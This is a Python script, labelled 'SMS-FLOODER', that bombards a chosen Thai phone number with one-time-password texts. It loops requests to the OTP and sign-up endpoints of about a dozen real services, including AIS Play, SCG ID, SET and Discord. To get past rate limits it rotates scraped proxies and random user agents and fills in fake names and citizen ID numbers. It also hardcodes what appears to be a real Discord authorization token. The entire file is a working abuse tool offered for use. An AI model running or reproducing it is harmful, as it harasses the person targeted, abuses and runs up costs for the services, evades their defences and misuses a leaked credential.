import time
import string
import requests
import colorama
import re
import os
from lxml.html import fromstring
from itertools import cycle
from concurrent.futures import ThreadPoolExecutor
from random import choice , randint

class Proxy():
    def get_proxies():
        response = requests.get("https://sslproxies.org/")
        parser = fromstring(response.text)
        proxies = set()
        for i in parser.xpath('//tbody/tr')[:10]:
            if i.xpath('.//td[7][contains(text(),"yes")]'):
                proxy = ":".join([i.xpath('.//td[1]/text()')[0], i.xpath('.//td[2]/text()')[0]])
                proxies.add(proxy)
        return proxies
        
class List():
    Stat = [] 
    useragent =[
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_5_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 14_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/92.0.4515.90 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (iPad; CPU OS 14_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/92.0.4515.90 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (iPod; CPU iPhone OS 14_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/92.0.4515.90 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 10; SM-A205U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 10; SM-A102U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 10; SM-G960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 10; SM-N960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 10; LM-Q720) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 10; LM-X420) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 10; LM-Q710(FGN)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Mobile Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 11.5; rv:90.0) Gecko/20100101 Firefox/90.0",
        "Mozilla/5.0 (X11; Linux i686; rv:90.0) Gecko/20100101 Firefox/90.0",
        "Mozilla/5.0 (Linux x86_64; rv:90.0) Gecko/20100101 Firefox/90.0",
        "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:90.0) Gecko/20100101 Firefox/90.0",
        "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:90.0) Gecko/20100101 Firefox/90.0",
        "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:90.0) Gecko/20100101 Firefox/90.0",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 11_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/35.0 Mobile/15E148 Safari/605.1.15",
        "Mozilla/5.0 (iPad; CPU OS 11_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/35.0 Mobile/15E148 Safari/605.1.15",
        "Mozilla/5.0 (iPod touch; CPU iPhone OS 11_5_1 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) FxiOS/35.0 Mobile/15E148 Safari/605.1.15",
        "Mozilla/5.0 (Android 11; Mobile; rv:68.0) Gecko/68.0 Firefox/90.0",
        "Mozilla/5.0 (Android 11; Mobile; LG-M255; rv:90.0) Gecko/90.0 Firefox/90.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 11.5; rv:78.0) Gecko/20100101 Firefox/78.0",
        "Mozilla/5.0 (X11; Linux i686; rv:78.0) Gecko/20100101 Firefox/78.0",
        "Mozilla/5.0 (Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0",
        "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:78.0) Gecko/20100101 Firefox/78.0",
        "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0",
        "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_5_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15",
        "Mozilla/5.0 (iPad; CPU OS 14_7_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (iPod touch; CPU iPhone 14_7_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36 Edg/92.0.902.62",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_5_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36 Edg/92.0.902.62",
        "Mozilla/5.0 (Linux; Android 10; HD1913) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Mobile Safari/537.36 EdgA/46.6.4.5160",
        "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Mobile Safari/537.36 EdgA/46.6.4.5160",
        "Mozilla/5.0 (Linux; Android 10; Pixel 3 XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Mobile Safari/537.36 EdgA/46.6.4.5160",
        "Mozilla/5.0 (Linux; Android 10; ONEPLUS A6003) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Mobile Safari/537.36 EdgA/46.6.4.5160",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 EdgiOS/46.3.13 Mobile/15E148 Safari/605.1.15",
        "Mozilla/5.0 (Windows Mobile 10; Android 10.0; Microsoft; Lumia 950XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Mobile Safari/537.36 Edge/40.15254.603",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; Xbox; Xbox One) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36 Edge/44.18363.8131"
        ]

class Secret():
    discordtoken = "ODYzNTYyODQyMzc1NDU0NzIw.YOotlQ.bpPgb-h8hHGOA09gNkEJdx2gvWc"

class URL():
    url_list = ["aisplay","cpfreshmart","cpsurprise","scgid","pizza1112","setmember","discord","nxsms","i.c.c" ,"prosalepage","baccara","mcard"]

    aisplay = "https://srfng.ais.co.th/login/sendOneTimePW"
    cpfreshmart = "https://cpfmapi.addressasia.com/wp-json/cpfm/v2/customer/get_otp"
    scgid = "https://api.scg-id.com/api/otp/send_otp"
    pizza1112 = "https://api2.1112.com/api/v1/otp/create"
    setmember = "https://api.set.or.th/api/otp/request"
    discord = "https://discord.com/api/v9/users/@me/phone"
    toyota = "https://www.toyotaprivilege.com/Register.aspx"
    nxsms = "https://play.okdbet.com/api/signup/send-sms"
    icc = "https://us-central1-otp-service-icc.cloudfunctions.net/"
    prosalepage  = "https://cms.prosalepage.com/api/shop/otpRequest"
    baccaratth = "https://api.baccaratth.com/api/v1/sendotp"
    mcard = "https://www.mcardmall.com/th/apply/check"

    setmemberref = "https://api.set.or.th/api/member/registration"

class StatusCode():
    success_code = [200,203,206,226,201,204,207,202,205,208]
    def response_status(response, choice):
        if response in StatusCode.success_code:
            List.Stat.append("SUCCESSFUL")
            os.system(f"title SMS-FLOODER ^| ALL API : {len(URL.url_list)} ^|AMOUNT : "+str(List.Stat.count("SUCCESSFUL"))+" ^| BY REACT")
            return f"{colorama.Fore.LIGHTGREEN_EX}[{response}] {choice} SUCCESSFUL"

        else:
            List.Stat.append("UNSUCCESSFUL")
            return f"{colorama.Fore.LIGHTRED_EX}[{response}] {choice} UNSUCCESSFUL"

    
    def check_internet():
        try:
            requests.get("https://www.google.com/", timeout=3)
            return True
        except (requests.ConnectionError, requests.Timeout):
            return False

class Random():
    thailetter = ['ก', 'ข', 'ฃ', 'ค', 'ฅ', 'ฆ', 'ง', 'จ', 'ฉ', 'ช', 'ซ', 'ฌ', 'ญ', 'ฎ', 'ฏ', 'ฐ', 'ฑ', 'ฒ', 'ณ', 'ด', 'ต', 'ถ', 'ท', 'ธ', 'น', 'บ', 'ป', 'ผ', 'ฝ', 'พ', 'ฟ', 'ภ', 'ม', 'ย', 'ร', 'ฤ', 'ล', 'ฦ', 'ว', 'ศ', 'ษ', 'ส', 'ห', 'ฬ', 'อ', 'ฮ']
    def username():
        usname = "".join(choice(string.ascii_letters +string.digits) for x in range(randint(8, 12)))
        return usname

    def name():
        name = "".join(choice(string.ascii_letters +string.digits) for x in range(randint(8, 12)))
        return name

    def firstnamethai():
        fname = "".join(choice(Random.thailetter) for x in range(randint(8, 16)))
        return fname
    
    def lastnamethai():
        lname = "".join(choice(Random.thailetter) for x in range(randint(8, 16)))
        return lname

    def email():
        email =  "".join(choice(string.ascii_letters +string.digits) for x in range(randint(8, 12)))
        return email+"@gmail.com"

    def password():
        password =  "".join(choice(string.ascii_letters + string.punctuation  + string.digits) for x in range(randint(8, 16)))
        return password

    def identification_card():
        citizenid = randint(1000000000000,9999999999999)
        return citizenid
        
class SMSspammer():
    def spamaisplay(number,count,proxy_list):
        data = f"msisdn=66{number[1:]}&serviceId=AISPlay&accountType=all&otpChannel=sms"
        headers = {
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "user-agent": choice(List.useragent)
            }
        for i in range(count):
            proxy = next(proxy_list)
            response = requests.Session().post(URL.aisplay,data=data,headers=headers,proxies={"http": proxy})
            print(StatusCode.response_status(response.status_code, "AISplay"))
            time.sleep(0.25)

    def spamcp(number,count,proxy_list):
        data = {"phone": number}
        headers = {
            "Content-Type": "application/json;charset=UTF-8",
            "user-agent": choice(List.useragent)
            }
        for i in range(count):
            proxy = next(proxy_list)
            response = requests.Session().post(URL.cpfreshmart, json=data, headers=headers,proxies={"http": proxy})
            print(StatusCode.response_status(response.status_code, "CP"))
            time.sleep(0.25)

    def spamscg(number,count,proxy_list):
        data = {"phone_no": number}
        headers = {
            "Content-Type": "application/json;charset=UTF-8",
            "user-agent": choice(List.useragent)
            }
        for i in range(count):
            proxy = next(proxy_list)
            response = requests.Session().post(URL.scgid,json=data ,headers=headers)
            print(StatusCode.response_status(response.status_code, "SCG"))
            time.sleep(0.25)

    def spam1112(number,count,proxy_list):
        proxy = next(proxy_list)
        data = {"phonenumber": number, "language": "th"}
        headers = {
            "Content-Type": "application/json;charset=UTF-8",
            "user-agent": choice(List.useragent)
            }
        for i in range(count):
            response = requests.Session().post(URL.pizza1112,json=data,headers=headers,proxies={"http": proxy})
            print(StatusCode.response_status(response.status_code , "1112"))
            time.sleep(0.25)
    
    def spamsetmember(number,count,proxy_list):
        citizenid = Random.identification_card()
        password = Random.password()
        fname = Random.firstnamethai()
        lname = Random.lastnamethai()
        email = Random.email()
        data = {"citizenId":citizenid,
        "passport":"",          
        "country":"th",
        "termFlag":"true",
        "subscriptionFlag":"true",
        "email":email,
        "password":password,
        "gender":"M",
        "firstName":fname,
        "lastName":lname,
        "mobile":f"+66{number[1:]}"}

        headers = {
            "content-type": "application/json",
            "user-agent": choice(List.useragent)
        }
        for i in range(count):
            proxy = next(proxy_list)
            response = requests.Session().post(URL.setmemberref,json=data,headers=headers,proxies={"http": proxy})
            refid = response.json()["userRef"]
            dataref = {"type":"REGISTRATION","refID":refid,"channel":"MOBILE"}
            response = requests.Session().post(URL.setmember,json=dataref,headers=headers,proxies={"http": proxy})
            print(StatusCode.response_status(response.status_code , "SET-Member"))  
            time.sleep(0.25)
    
    def spamdiscord(number,count,proxy_list):
        data = {"phone":f"+66{number[1:]}"}
        headers = {"content-type": "application/json",
            "authorization":Secret.discordtoken}
        for i in range(count):
            proxy = next(proxy_list)
            response = requests.Session().post(URL.discord,json=data,headers=headers,proxies={"http": proxy})
            print(StatusCode.response_status(response.status_code , "Discord"))
            time.sleep(0.25)

    def spamnxsms(number,count,proxy_list):
        data = f"phone={number}"
        headers = {"content-type": "application/x-www-form-urlencoded; charset=UTF-8"}
        for i in range(count):
            proxy = next(proxy_list)
            response = requests.Session().post(URL.nxsms,data=data,headers=headers,proxies={"http": proxy})
            print(StatusCode.response_status(response.status_code , "nxsms"))
            time.sleep(0.25)
        
    def spamicc(number,count,proxy_list):
        data = {"mobile_phone": number,"type":"HISHER"}
        headers = {"content-type": "application/json"}
        for i in range(count):
            proxy = next(proxy_list)
            response = requests.post(URL.icc,json=data,headers=headers,proxies={"http": proxy})
            print(StatusCode.response_status(response.status_code , "I.C.C"))
            time.sleep(0.25)
    
    def spamprosalepage(number,count,proxy_list):
        name = Random.name()
        username = Random.username()
        password = Random.password
        data = {"name": name, "tel": number,
                "username": username, 
                "password": password,
                "type":"SYSTEM", 
                "plan":"Basic",
                "from":"GOOGLE", 
                "displayName":username, 
                "sale":"2"}
        headers = {"content-type": "application/json",
            "user-agent": choice(List.useragent)}
        for i in range(count):
            proxy = next(proxy_list)
            response = requests.post(URL.prosalepage,data=data,headers=headers,proxies={"http": proxy})
            print(StatusCode.response_status(response.status_code , "prosalepage"))
            time.sleep(0.25)
    
    def spambaccaratth(number,count,proxy_list):
        data = {"phone_number": number}
        headers = {"content-type": "application/json",
            "user-agent": choice(List.useragent)}
        for i in range(count):
            proxy = next(proxy_list)
            response = requests.post(URL.baccaratth,json=data,headers=headers,proxies={"http": proxy})
            print(StatusCode.response_status(response.status_code , "VIP"))
            time.sleep(0.25)
    
    def spammcard(number,count,proxy_list):
        sessiontoken = re.search("""<input type="hidden" name="_token" value="(.*)">""",requests.Session().get("https://www.mcardmall.com/th/apply/check").text).group(1)
        data = f"{sessiontoken}&mode=check&identity={Random.identification_card}&contact={number}&P0=on&P1=on&P2=on"
        headers = {"content-type": "application/x-www-form-urlencoded",
            "user-agent": choice(List.useragent)}
        for i in range(count):
            proxy = next(proxy_list)
            response = requests.Session().post(URL.mcard,data=data, headers=headers,proxies={"http": proxy})
            print(StatusCode.response_status(response.status_code , "mcard"))
            time.sleep(0.25)

class SpamMenu():
    logo = f"""                                                                                                                   
    {colorama.Fore.LIGHTBLUE_EX}              ██████  ███▄ ▄███▓  ██████      █████▒██▓     ▒█████   ▒█████  ▓█████▄ ▓█████  ██▀███     {colorama.Fore.WHITE}B{colorama.Fore.LIGHTBLUE_EX} 
                ▒██    ▒ ▓██▒▀█▀ ██▒▒██    ▒    ▓██   ▒▓██▒    ▒██▒  ██▒▒██▒  ██▒▒██▀ ██▌▓█   ▀ ▓██ ▒ ██▒   {colorama.Fore.WHITE}Y{colorama.Fore.LIGHTBLUE_EX} 
                ░ ▓██▄   ▓██    ▓██░░ ▓██▄      ▒████ ░▒██░    ▒██░  ██▒▒██░  ██▒░██   █▌▒███   ▓██ ░▄█ ▒  
                  ▒   ██▒▒██    ▒██   ▒   ██▒   ░▓█▒  ░▒██░    ▒██   ██░▒██   ██░░▓█▄   ▌▒▓█  ▄ ▒██▀▀█▄     {colorama.Fore.WHITE}R{colorama.Fore.LIGHTBLUE_EX} 
                ▒██████▒▒▒██▒   ░██▒▒██████▒▒   ░▒█░   ░██████▒░ ████▓▒░░ ████▓▒░░▒████▓ ░▒████▒░██▓ ▒██▒   {colorama.Fore.WHITE}E{colorama.Fore.LIGHTBLUE_EX} 
                ▒ ▒▓▒ ▒ ░░ ▒░   ░  ░▒ ▒▓▒ ▒ ░    ▒ ░   ░ ▒░▓  ░░ ▒░▒░▒░ ░ ▒░▒░▒░  ▒▒▓  ▒ ░░ ▒░ ░░ ▒▓ ░▒▓░   {colorama.Fore.WHITE}A{colorama.Fore.LIGHTBLUE_EX} 
                ░ ░▒  ░ ░░  ░      ░░ ░▒  ░ ░    ░     ░ ░ ▒  ░  ░ ▒ ▒░   ░ ▒ ▒░  ░ ▒  ▒  ░ ░  ░  ░▒ ░ ▒░   {colorama.Fore.WHITE}C{colorama.Fore.LIGHTBLUE_EX} 
                ░  ░  ░  ░      ░   ░  ░  ░      ░ ░     ░ ░   ░ ░ ░ ▒  ░ ░ ░ ▒   ░ ░  ░    ░     ░░   ░    {colorama.Fore.WHITE}T{colorama.Fore.LIGHTBLUE_EX}"""
    menu = f"""
                    {colorama.Fore.WHITE}[{colorama.Fore.LIGHTCYAN_EX}+{colorama.Fore.WHITE}]{colorama.Fore.CYAN} 1. ALL            {colorama.Fore.WHITE}[{colorama.Fore.LIGHTCYAN_EX}+{colorama.Fore.WHITE}]{colorama.Fore.CYAN} 6. SET-MEMBER           {colorama.Fore.WHITE}[{colorama.Fore.LIGHTCYAN_EX}+{colorama.Fore.WHITE}]{colorama.Fore.CYAN} 11. VIP
                    {colorama.Fore.WHITE}[{colorama.Fore.LIGHTCYAN_EX}+{colorama.Fore.WHITE}]{colorama.Fore.CYAN} 2. AISPLAY        {colorama.Fore.WHITE}[{colorama.Fore.LIGHTCYAN_EX}+{colorama.Fore.WHITE}]{colorama.Fore.CYAN} 7. DISCORD              {colorama.Fore.WHITE}[{colorama.Fore.LIGHTCYAN_EX}+{colorama.Fore.WHITE}]{colorama.Fore.CYAN} 12. MCARD
                    {colorama.Fore.WHITE}[{colorama.Fore.LIGHTCYAN_EX}+{colorama.Fore.WHITE}]{colorama.Fore.CYAN} 3. CP             {colorama.Fore.WHITE}[{colorama.Fore.LIGHTCYAN_EX}+{colorama.Fore.WHITE}]{colorama.Fore.CYAN} 8. NXSMS                {colorama.Fore.WHITE}[{colorama.Fore.LIGHTCYAN_EX}+{colorama.Fore.WHITE}]{colorama.Fore.CYAN} 13. EXIT
                    {colorama.Fore.WHITE}[{colorama.Fore.LIGHTCYAN_EX}+{colorama.Fore.WHITE}]{colorama.Fore.CYAN} 4. SCGID          {colorama.Fore.WHITE}[{colorama.Fore.LIGHTCYAN_EX}+{colorama.Fore.WHITE}]{colorama.Fore.CYAN} 9. I.C.C                {colorama.Fore.WHITE}[{colorama.Fore.LIGHTCYAN_EX}+{colorama.Fore.WHITE}]{colorama.Fore.CYAN} 14. RESTART
                    {colorama.Fore.WHITE}[{colorama.Fore.LIGHTCYAN_EX}+{colorama.Fore.WHITE}]{colorama.Fore.CYAN} 5. 1112           {colorama.Fore.WHITE}[{colorama.Fore.LIGHTCYAN_EX}+{colorama.Fore.WHITE}]{colorama.Fore.CYAN} 10.PROSALEPAGE
    """

class Process():   
    def clear():
        os.system("cls" if os.name == "nt" else "clear")
    
    def taskfinish(number, total,success,unsuccess , timetaken,method):
        Process.clear()
        print(f"""\n\n\n\n                       
                                        {colorama.Fore.WHITE} [{colorama.Fore.LIGHTCYAN_EX}*{colorama.Fore.WHITE}] {colorama.Fore.CYAN}TARGET      {colorama.Fore.WHITE}| {number}
                                        {colorama.Fore.WHITE} [{colorama.Fore.LIGHTCYAN_EX}*{colorama.Fore.WHITE}] {colorama.Fore.CYAN}METHOD      {colorama.Fore.WHITE}| {method}
                                        {colorama.Fore.WHITE} [{colorama.Fore.LIGHTCYAN_EX}*{colorama.Fore.WHITE}] {colorama.Fore.CYAN}TOTAL       {colorama.Fore.WHITE}| {total}
                                        {colorama.Fore.WHITE} [{colorama.Fore.LIGHTCYAN_EX}*{colorama.Fore.WHITE}] {colorama.Fore.CYAN}SUCCESSFUL  {colorama.Fore.WHITE}| {success}
                                        {colorama.Fore.WHITE} [{colorama.Fore.LIGHTCYAN_EX}*{colorama.Fore.WHITE}] {colorama.Fore.CYAN}UNSUCCESSFUL{colorama.Fore.WHITE}| {unsuccess}
                                        {colorama.Fore.WHITE} [{colorama.Fore.LIGHTCYAN_EX}*{colorama.Fore.WHITE}] {colorama.Fore.CYAN}TIME        {colorama.Fore.WHITE}| {round(timetaken,2)} s            
                                        """)
        input("\n                                         PRESS ENTER TO CONTINUE")
        Process.clear()
        main()

    def method(number):
        print(f"                    {colorama.Fore.LIGHTBLACK_EX}METHOD (NUMBER)")
        proxies = Proxy.get_proxies()
        proxy_list = cycle(proxies)
        method = str(input(f"                    {colorama.Fore.WHITE}> "))
        if method == "1" or method.lower() == "all":
            print(f"                    {colorama.Fore.LIGHTBLACK_EX}LOOP")
            count = int(input(f"                    {colorama.Fore.WHITE}> "))
            if count <= 0:
                return main()

            start = time.time()
            threads= []
            with ThreadPoolExecutor(max_workers=20) as executor:
                for fucntion in (SMSspammer.spamaisplay, SMSspammer.spamcp, SMSspammer.spamscg,SMSspammer.spam1112,SMSspammer.spamsetmember,SMSspammer.spamdiscord,SMSspammer.spamnxsms,SMSspammer.spamicc,SMSspammer.spamprosalepage,SMSspammer.spambaccaratth,SMSspammer.spammcard):
                    threads.append(executor.submit(fucntion, number, count,proxy_list))

            timetaken = time.time() - start

            Process.taskfinish(number , len(List.Stat),List.Stat.count("SUCCESSFUL"),List.Stat.count("UNSUCCESSFUL") , timetaken,"ALL") 
            time.sleep(0.25)

        elif method == "2" or method.lower() == "aisplay":
            print(f"                    {colorama.Fore.LIGHTBLACK_EX}LOOP")
            count = int(input(f"                    {colorama.Fore.WHITE}> "))
            if count <= 0:
                return main()
            start = time.time()
            SMSspammer.spamaisplay(number, count,proxy_list)
            timetaken = time.time() - start
            
            Process.taskfinish(number , len(List.Stat),List.Stat.count("SUCCESSFUL"),List.Stat.count("UNSUCCESSFUL") , timetaken, "AISPLAY")

        elif method == "3" or method.lower() == "cp":
            print(f"                    {colorama.Fore.LIGHTBLACK_EX}LOOP")
            count = int(input(f"                    {colorama.Fore.WHITE}> "))
            if count <= 0:
                return main()
            start = time.time()
            SMSspammer.spamcp(number, count,proxy_list)
            timetaken = time.time() - start
            Process.taskfinish(number , len(List.Stat),List.Stat.count("SUCCESSFUL"),List.Stat.count("UNSUCCESSFUL") , timetaken, "CP")
        
        elif method == "4" or method.lower() == "scg":
            print(f"                    {colorama.Fore.LIGHTBLACK_EX}LOOP")
            count = int(input(f"                    {colorama.Fore.WHITE}> "))
            if count <= 0:
                return main()
            start = time.time()
            SMSspammer.spamscg(number, count,proxy_list)
            timetaken = time.time() - start
            Process.taskfinish(number , len(List.Stat),List.Stat.count("SUCCESSFUL"),List.Stat.count("UNSUCCESSFUL") , timetaken, "SCG")

        elif method == "5" or method.lower() == "1112":
            print(f"                    {colorama.Fore.LIGHTBLACK_EX}LOOP")
            count = int(input(f"                    {colorama.Fore.WHITE}> "))
            if count <= 0:
                return main()
            start = time.time()   
            SMSspammer.spam1112(number, count,proxy_list)
            timetaken = time.time() - start
            Process.taskfinish(number , len(List.Stat),List.Stat.count("SUCCESSFUL"),List.Stat.count("UNSUCCESSFUL") , timetaken, "1112")
        
        elif method == "6" or method.lower() == "set-member" or method.lower() == "setmember":
            print(f"                    {colorama.Fore.LIGHTBLACK_EX}LOOP")
            count = int(input(f"                    {colorama.Fore.WHITE}> "))
            if count <= 0:
                return main()
            start = time.time()   
            SMSspammer.spamsetmember(number, count,proxy_list)
            timetaken = time.time() - start
            Process.taskfinish(number , len(List.Stat),List.Stat.count("SUCCESSFUL"),List.Stat.count("UNSUCCESSFUL") , timetaken, "SET-Member")
        
        elif method == "7" or method.lower() == "discord":
            print(f"                    {colorama.Fore.LIGHTBLACK_EX}LOOP")
            count = int(input(f"                    {colorama.Fore.WHITE}> "))
            if count <= 0:
                return main()
            start = time.time()   
            SMSspammer.spamdiscord(number, count,proxy_list)
            timetaken = time.time() - start
            Process.taskfinish(number , len(List.Stat),List.Stat.count("SUCCESSFUL"),List.Stat.count("UNSUCCESSFUL") , timetaken, "Discord")
        
        elif method == "8" or method.lower() == "nxsms" :
            print(f"                    {colorama.Fore.LIGHTBLACK_EX}LOOP")
            count = int(input(f"                    {colorama.Fore.WHITE}> "))
            if count <= 0:
                return main()
            start = time.time()   
            SMSspammer.spamnxsms(number, count,proxy_list)
            timetaken = time.time() - start
            Process.taskfinish(number , len(List.Stat),List.Stat.count("SUCCESSFUL"),List.Stat.count("UNSUCCESSFUL") , timetaken, "NXSMS")
        
        elif method == "9" or method.lower() == "icc" :
            print(f"                    {colorama.Fore.LIGHTBLACK_EX}LOOP")
            count = int(input(f"                    {colorama.Fore.WHITE}> "))
            if count <= 0:
                return main()
            start = time.time()   
            SMSspammer.spamicc(number, count,proxy_list)
            timetaken = time.time() - start
            Process.taskfinish(number , len(List.Stat),List.Stat.count("SUCCESSFUL"),List.Stat.count("UNSUCCESSFUL") , timetaken, "I.C.C")
        
        elif method == "10" or method.lower() == "prosalepage" :
            print(f"                    {colorama.Fore.LIGHTBLACK_EX}LOOP")
            count = int(input(f"                    {colorama.Fore.WHITE}> "))
            if count <= 0:
                return main()
            start = time.time()   
            SMSspammer.spamprosalepage(number, count,proxy_list)
            timetaken = time.time() - start
            Process.taskfinish(number , len(List.Stat),List.Stat.count("SUCCESSFUL"),List.Stat.count("UNSUCCESSFUL") , timetaken, "prosalepage")
        
        elif method == "11" or method.lower() == "vip" :
            print(f"                    {colorama.Fore.LIGHTBLACK_EX}LOOP")
            count = int(input(f"                    {colorama.Fore.WHITE}> "))
            if count <= 0:
                return main()
            start = time.time()   
            SMSspammer.spambaccaratth(number, count,proxy_list)
            timetaken = time.time() - start
            Process.taskfinish(number , len(List.Stat),List.Stat.count("SUCCESSFUL"),List.Stat.count("UNSUCCESSFUL") , timetaken, "vip")
        
        elif method == "12" or method.lower() == "mcard" :
            print(f"                    {colorama.Fore.LIGHTBLACK_EX}LOOP")
            count = int(input(f"                    {colorama.Fore.WHITE}> "))
            if count <= 0:
                return main()
            start = time.time()   
            SMSspammer.spammcard(number, count,proxy_list)
            timetaken = time.time() - start
            Process.taskfinish(number , len(List.Stat),List.Stat.count("SUCCESSFUL"),List.Stat.count("UNSUCCESSFUL") , timetaken, "mcard")
        
        elif method == "14" or method.lower() == "exit":
            os.system("exit")
        
        elif method == "15" or method.lower() == "restart":
            main()
        
        else:
            print(f"                    {colorama.Fore.LIGHTBLACK_EX}INAVLID CHOICE{colorama.Fore.LIGHTBLACK_EX}")
            input("                    PRESS ENTER TO RESTART")
            main()

def main():
    Process.clear()
    List.Stat.clear()
    os.system(f"title SMS-FLOODER ^| ALL API : {len(URL.url_list)} ^| BY REACT")
    if StatusCode.check_internet() is True:
        print(SpamMenu.logo + "\n" + SpamMenu.menu)
        print(f"                    {colorama.Fore.LIGHTBLACK_EX}PLEASE ENTER YOUR PHONE NUMBER")
        number = str(input(f"                      {colorama.Fore.WHITE}> "))
        if len(number) != 10:
            if len(number) < 2 or number[0] + number[1] == "66":
                number = (f"0{number[2:]}")
                if len(number) != 10:
                    print(f"                    {colorama.Fore.LIGHTBLACK_EX}INAVLID NUMBER{colorama.Fore.LIGHTBLACK_EX}")
                    input("                    PRESS ENTER TO RESTART")
                    main()
            
            elif len(number) < 3 or number[0] + number[1] + number[2] == "+66":
                number = (f"0{number[3:]}")
                if len(number) != 10:
                    print(f"                    {colorama.Fore.LIGHTBLACK_EX}INAVLID NUMBER{colorama.Fore.LIGHTBLACK_EX}")
                    input("                    PRESS ENTER TO RESTART")
                    main()
                
            else:
                print(f"                    {colorama.Fore.LIGHTBLACK_EX}INAVLID NUMBER{colorama.Fore.LIGHTBLACK_EX}")
                input("                    PRESS ENTER TO RESTART")
                main()
        Process.method(number)
    
    else:
        print("No internet connection")

main()
